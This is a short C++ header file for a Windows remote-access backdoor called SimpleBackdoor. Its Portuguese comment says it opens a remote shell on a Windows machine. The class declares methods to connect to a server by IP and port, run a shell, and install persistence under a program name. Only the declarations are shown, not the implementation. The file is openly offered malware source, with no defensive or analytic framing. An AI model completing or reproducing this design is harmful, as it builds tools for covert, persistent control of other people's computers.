/*
Class SimpleBackdoor

abre um shell remoto em uma máquina do Windows.
criador por @notbother
*/

#ifndef H_SIMPLEBACKDOOR
#define H_SIMPLEBACKDOOR

#define _WIN32_WINNT 0x501
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#define RECV_BUFLEN 512
#define CMD_BUFLEN 4096

class SimpleBackdoor {

    SimpleBackdoor();

    static SimpleBackdoor* instance;

    SOCKET connectSocket;

    void log(std::string line);

public:

    ~SimpleBackdoor();

    static SimpleBackdoor* getInstance();

    void connectToServer(std::string ip, std::string port);

    void doShell();

    void persist(std::string programName);
};

#endif
